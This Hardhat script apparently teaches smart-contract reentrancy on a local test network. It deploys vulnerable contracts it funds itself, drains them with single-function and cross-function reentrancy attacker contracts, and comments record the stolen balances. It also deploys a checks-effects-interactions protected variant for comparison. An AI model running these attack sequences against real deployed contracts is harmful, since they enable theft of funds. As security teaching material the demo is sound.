const hre = require('hardhat')

async function main() {
   const VulnerableEtherSender = await hre.ethers.getContractFactory(
     'VulnerableEtherSender',
   )
   const vulnerableEtherSender = await VulnerableEtherSender.deploy({
     value: hre.ethers.utils.parseEther('10'),
   })
   await vulnerableEtherSender.deployed()

   const AttackerEtherReceiver = await hre.ethers.getContractFactory(
     'AttackerEtherReceiver',
   )
   const attackerEtherReceiver = await AttackerEtherReceiver.deploy(
     vulnerableEtherSender.address,
   )
   await attackerEtherReceiver.deployed()

   console.log(
     'BEFORE ATTACK THE BALANCE OF VULNERABLE CONTRACT IS :',
     await vulnerableEtherSender.getBalance(),
   )
   console.log(
     'BEFORE ATTACK THE BALANCE OF ATTACKER CONTRACT IS :',
     await attackerEtherReceiver.getBalance(),
   )

  // // Both contract are available setup an attack vector
   await attackerEtherReceiver.deposit({
     value: hre.ethers.utils.parseEther('1'),
   })

   console.log(
     'AFTER ATTACK THE BALANCE OF VULNERABLE CONTRACT IS :',
     await vulnerableEtherSender.getBalance(),
   )
   console.log(
     'AFTER ATTACK THE BALANCE OF ATTACKER CONTRACT IS :',
     await attackerEtherReceiver.getBalance(),
   )

  /***
        BEFORE ATTACK THE BALANCE OF VULNERABLE CONTRACT IS : BigNumber { value: "10000000000000000000" }
        BEFORE ATTACK THE BALANCE OF ATTACKER CONTRACT IS : BigNumber { value: "0" }
        AFTER ATTACK THE BALANCE OF VULNERABLE CONTRACT IS : BigNumber { value: "0" }
        AFTER ATTACK THE BALANCE OF ATTACKER CONTRACT IS : BigNumber { value: "11000000000000000000" }
    */

   const ChecksEffectsInteractionProtectedEtherSender = await hre.ethers.getContractFactory(
     'ChecksEffectsInteractionProtectedEtherSender',
   )
   const checksEffectsInteractionProtectedEtherSender = await ChecksEffectsInteractionProtectedEtherSender.deploy()
   await checksEffectsInteractionProtectedEtherSender.deployed()

   const AttackerForChecksEffectsInteractionProtectedEtherSender = await hre.ethers.getContractFactory(
     'AttackerEtherReceiver',
   )
   const attackerForChecksEffectsInteractionProtectedEtherSender = await AttackerForChecksEffectsInteractionProtectedEtherSender.deploy(
     checksEffectsInteractionProtectedEtherSender.address,
   )
   await attackerForChecksEffectsInteractionProtectedEtherSender.deployed()

   await attackerForChecksEffectsInteractionProtectedEtherSender.deposit({
     value: hre.ethers.utils.parseEther('1'),
   })

  const VulnerableEtherContract = await hre.ethers.getContractFactory(
    'VulnerableEtherContract',
  );

  const vulnerableEtherContract = await VulnerableEtherContract.deploy({
    value: hre.ethers.utils.parseEther('4'),
  });
  await vulnerableEtherContract.deployed();

  const CrossFunctionAttacker1 = await hre.ethers.getContractFactory(
    'CrossFunctionAttacker',
  );
  const crossFunctionAttacker1 = await CrossFunctionAttacker1.deploy(vulnerableEtherContract.address);
  await crossFunctionAttacker1.deployed();

  const CrossFunctionAttacker2 = await hre.ethers.getContractFactory(
    'CrossFunctionAttacker',
  );
  const crossFunctionAttacker2 = await CrossFunctionAttacker2.deploy(vulnerableEtherContract.address);
  await crossFunctionAttacker2.deployed();

  crossFunctionAttacker1.setAttackPeer(crossFunctionAttacker2.address);
  crossFunctionAttacker2.setAttackPeer(crossFunctionAttacker1.address);

  console.log("BEFORE ATTACK VulnerableEtherContract Address ", vulnerableEtherContract.address);
  console.log("BEFORE ATTACK VulnerableEtherContract Balance ", await vulnerableEtherContract.getBalance());
  console.log("BEFORE ATTACK CrossFunctionAttacker1 Address ", crossFunctionAttacker1.address);
  console.log("BEFORE ATTACK CrossFunctionAttacker1 Balance ", await crossFunctionAttacker1.getBalance());
  console.log("BEFORE ATTACK CrossFunctionAttacker2 Address ", crossFunctionAttacker2.address);

  await crossFunctionAttacker1.attackInit({value: hre.ethers.utils.parseEther('1')})
  /** 
    attackInit is triggered VulnerableEtherContract Balance  BigNumber { value: "4000000000000000000" }
    attackInit is triggered CrossFunctionAttacker1 Balance  BigNumber { value: "0" }
    attackInit is triggered CrossFunctionAttacker2 Balance  BigNumber { value: "1000000000000000000" }
   */
  
  await crossFunctionAttacker2.attackNext()
  /** 
    attackNext is triggered VulnerableEtherContract Balance  BigNumber { value: "3000000000000000000" }
    attackNext is triggered CrossFunctionAttacker1 Balance  BigNumber { value: "1000000000000000000" }
    attackNext is triggered CrossFunctionAttacker2 Balance  BigNumber { value: "0" }
   */
  await crossFunctionAttacker1.attackNext()
  /** 
    attackNext is triggered VulnerableEtherContract Balance  BigNumber { value: "2000000000000000000" }
    attackNext is triggered CrossFunctionAttacker1 Balance  BigNumber { value: "0" }
    attackNext is triggered CrossFunctionAttacker2 Balance  BigNumber { value: "1000000000000000000" }
   */
  await crossFunctionAttacker2.attackNext()
  /** 
    attackNext is triggered VulnerableEtherContract Balance  BigNumber { value: "1000000000000000000" }
    attackNext is triggered CrossFunctionAttacker1 Balance  BigNumber { value: "1000000000000000000" }
    attackNext is triggered CrossFunctionAttacker2 Balance  BigNumber { value: "0" }
   */
  await crossFunctionAttacker1.attackNext()
  /** 
    attackNext is triggered VulnerableEtherContract Balance  BigNumber { value: "0" }
    attackNext is triggered CrossFunctionAttacker1 Balance  BigNumber { value: "0" }
    attackNext is triggered CrossFunctionAttacker2 Balance  BigNumber { value: "0" }
   */

  console.log("AFTER ATTACK VulnerableEtherContract Address ", vulnerableEtherContract.address);
  console.log("AFTER ATTACK VulnerableEtherContract Balance ", await vulnerableEtherContract.getBalance());
  console.log("AFTER ATTACK CrossFunctionAttacker1 Address ", crossFunctionAttacker1.address);
  console.log("AFTER ATTACK CrossFunctionAttacker1 Balance ", await crossFunctionAttacker1.getBalance());
  console.log("AFTER ATTACK CrossFunctionAttacker2 Address ", crossFunctionAttacker2.address);
  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })